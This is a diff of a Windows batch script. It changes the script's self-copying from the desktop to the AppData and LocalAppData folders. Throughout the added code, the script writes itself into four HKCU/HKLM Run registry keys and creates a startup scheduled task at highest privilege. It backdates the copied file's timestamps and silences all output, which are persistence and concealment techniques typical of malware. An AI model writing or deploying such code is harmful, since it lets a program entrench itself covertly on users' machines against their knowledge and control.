@@ -109,23 +109,25 @@ if exist "%path_autoRun2%\%~nx0" (
 
 
 
-if exist "%path_desktop%\%~nx0" (
-  (
-    reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
-    reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
-    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
-    reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
-    schtasks /create /sc onstart /tn "%app_name% Desktop" /tr "%path_desktop%\%~nx0" /f /rl highest
-  )>nul 2>nul
-) else (
-  copy /y "%~dpnx0" "%path_desktop%\"
-  (
-    if exist "%path_desktop%\%~nx0" (
-      attrib -h -r -s "%path_desktop%\%~nx0"
-      %module_fileTouch% /w /a /c /d %app_date% "%path_desktop%\%~nx0"
-      rem attrib +h +r +s "%path_desktop%\%~nx0"
-    )
-  )>nul 2>nul
+for %%i in (localAppData appData) do (
+  if exist "!%%i!\%~nx0" (
+    (
+      call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
+      call reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
+      call reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
+      call reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
+      call schtasks /create /sc onstart /tn "%app_name% %%i" /tr "!%%i!\%~nx0" /f /rl highest
+    )>nul 2>nul
+  ) else (
+    call copy /y "%~dpnx0" "!%%i!\"
+    (
+      if exist "!%%i!\%~nx0" (
+        call attrib -h -r -s "!%%i!\%~nx0"
+        call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
+        rem call attrib +h +r +s "!%%i!\%~nx0"
+      )
+    )>nul 2>nul
+  )
 )
 
 
